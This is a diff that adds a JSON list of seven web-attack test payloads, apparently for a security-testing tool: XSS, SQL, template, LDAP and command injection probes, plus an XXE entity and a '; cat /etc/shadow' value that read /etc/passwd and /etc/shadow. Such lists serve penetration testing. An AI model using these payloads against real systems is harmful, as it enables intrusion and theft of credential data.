@@ -1,0 +1,32 @@
+{
+    "payloads": [
+      {"title": "XSS",
+        "id": "xss",
+        "payload": "<img src=1 onerror=alert()>"
+      },
+      {"title": "Simple quote SQLi",
+        "id": "simple-sqli",
+        "payload": "' or 1=1;-- "
+      },
+      {"title": "Double quote SQLi",
+        "id": "double-sqli",
+        "payload": "\" or 1=1;-- "
+      },
+      {"title": "Template Injection",
+        "id": "template-injection",
+        "payload": "${7*7}"
+      },
+      {"title": "XXE read file",
+        "id": "xxe-read-file",
+        "payload": "<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY read SYSTEM \"file:///etc/passwd\">]><root>&read;</root>"
+      },
+      {"title": "LDAP Injection",
+        "id": "ldap",
+        "payload": "*()|&'"
+      },
+      {"title": "Command injection",
+        "id": "Command",
+        "payload": "; cat /etc/shadow"
+      }
+    ]
+}
